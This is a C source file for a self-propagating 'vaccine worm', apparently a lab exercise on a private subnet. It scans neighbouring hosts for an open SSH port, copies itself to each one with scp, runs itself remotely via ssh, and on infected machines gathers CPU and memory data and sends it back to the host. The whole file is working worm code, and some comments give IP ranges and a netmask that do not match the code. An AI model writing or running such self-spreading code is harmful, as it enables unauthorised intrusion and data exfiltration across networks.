#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <limits.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <pwd.h>
#include <time.h>

#define HOST_IP_ADDRESS "192.168.56.1"

int findCorrectAddress(char *ip);
void scanNetworkAndColonize(char* program_name, char* user_name);
void clientProcessing(char* program_name, char* client_ip, char* user_name);

/*
 * findCorrectAddress
 * The purpose of this function is to loop over the IPs of a machine
 * and find the IP that belongs to the same network as the host.
 * 
 * @param ip : the IP address that has been found
 * @return : 0 if IP could not be found, 1 if success.
 */
int findCorrectAddress(char *ip)
{
    int s;
    struct ifconf ifconf;
    struct ifreq ifr[50];
    int ifs;
    int i;

    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) {
        perror("socket");
        return 0;
    }

    ifconf.ifc_buf = (char *) ifr;
    ifconf.ifc_len = sizeof ifr;

    // Call ifconfig ioctl, to get all system IPs
    if (ioctl(s, SIOCGIFCONF, &ifconf) == -1) {
        perror("ioctl");
        return 0;
    }

    // Loop through and select the IP that corresponds to the network where the host is located
    ifs = ifconf.ifc_len / sizeof(ifr[0]);
    for (i = 0; i < ifs; i++) {
        struct sockaddr_in *s_in = (struct sockaddr_in *) &ifr[i].ifr_addr;

        if (!inet_ntop(AF_INET, &s_in->sin_addr, ip, 16*sizeof(char))) {
            perror("inet_ntop");
            return 0;
        }

        if(strncmp(HOST_IP_ADDRESS,ip,11) == 0)
        {
            // We just found an IP inside host network : stop search there.
            return 1;
        }
    }

    close(s);

    return 0;
}

/*
 * clientProcessing()
 * The purpose of this function is to :
 *      1 - check the presence of file "datav" on the client
 *      2 - if not present, remove the "vaccine worm" executable
 *      3 - if present
 *          a -dump client CPU and memory info into datav
 *          b - copy datav file to the host
 *
 * @param program_name: the name of the executable currebtly running
 * @param client_ip: the IP address of the client on which the executable is running
 * @param user_name: the name of the user who is running the executable
 */
void clientProcessing(char* program_name, char* client_ip, char* user_name)
{
    time_t timer;
    char buffer[80];
    struct tm* tm_info;
    char command[UCHAR_MAX];

    // Calculate current time & date
    time(&timer);
    tm_info = localtime(&timer);
    strftime(buffer, 80, "%Y%m%d_%H%M%S", tm_info);

    //Dump client CPU and memory information into a file and then copy result to the host
    memset(command,'\0',UCHAR_MAX);
    snprintf(command, UCHAR_MAX, "if [ ! -e datav ]; then rm %s;\
            else cat /proc/meminfo > datav; cat /proc/cpuinfo >> datav; \
            scp ~/datav %s@%s:~/datav_%s_%s; fi",program_name,user_name,HOST_IP_ADDRESS,client_ip,buffer);
    system(command);
}

/*
 * scanNetworkAndColonize()
 * The purpose of this function is to :
 *      1 - scan network, looking for clients that have open ssh port
 *      2 - colonize (copy vaccine worm executable) the accessible clients
 *
 * @param program_name: the name of the executable currebtly running
 * @param user_name: the name of the user who is running the executable
 */
void scanNetworkAndColonize(char* program_name, char* user_name)
{
    int target;
    int Connection, error;
    char target_ip[16];
    char ip_comp[4];
    struct sockaddr_in temp = { 0 };
    char command[UCHAR_MAX];

    //loop through and scan all addresses from 192.168.16.101 to 192.168.16.111
    for (target = 101; target < 111; target++)
    {
        Connection = socket(AF_INET,SOCK_STREAM, 0);
        temp = (struct sockaddr_in){ 0 };
        memset(target_ip,'\0',16);
        // Initialize target_ip with the HOST_IP_ADDRESS as they are on the same network.
        strncpy(target_ip, HOST_IP_ADDRESS, 16);
        target_ip[strlen(target_ip)-1] = '\0';
        /* 
         * Change the last byte of the target_ip, as the network mask is 255.255.255.0.
         * The last byte will be assigned to the "target" value.
         */
        snprintf(ip_comp, 4, "%d",target);
        strncat(target_ip, ip_comp, 16);

        if(strncmp(target_ip,HOST_IP_ADDRESS,16) != 0)
        {
            // Prepare socket structure for new target scanning
            temp.sin_addr.s_addr = inet_addr(target_ip);
            temp.sin_family = AF_INET;
            temp.sin_port = htons(22); // port 22 is ssh port

            // Try and connect using filled socket
            error = connect(Connection, (struct sockaddr*)&temp, sizeof temp);
            if(error != -1) 
            {
                /*
                 * if the port 22 is open then
                 *      1 - colonize client (copy "vaccine worm" to target)
                 */
                memset(command,'\0',UCHAR_MAX);
                snprintf(command, UCHAR_MAX, "scp ./%s %s@%s:~",program_name,user_name,target_ip);
                system(command);
                //      2 - run the virus on the client
                memset(command,'\0',UCHAR_MAX);
                snprintf(command, UCHAR_MAX, "ssh %s@%s 'if [ -e %s ]; then ~/%s; fi'",user_name,target_ip,program_name,program_name);
                system(command);
            }
            close(Connection);
        }
    }

}

int main(int argc, char **argv)
{
    char system_ip[16];
    // Used to get the name of the user running the program
    struct passwd *pw = getpwuid(geteuid());

    /*
     * Find IP address of the system that corresponds to HOST network
     * (192.168.16.0 / 255.255.225.0)
     */
    if(findCorrectAddress(system_ip) == 0)
        return EXIT_FAILURE;

    /*
     * If the program is running from host :
     * scan network and colonize accessible clients.
     */
    if(strncmp(HOST_IP_ADDRESS,system_ip,16) == 0)
    {
        scanNetworkAndColonize(argv[0], pw->pw_name);
    }
    //Else try launch client processing
    else
    {
        clientProcessing(argv[0], system_ip, pw->pw_name);
    }
    return EXIT_SUCCESS;
}
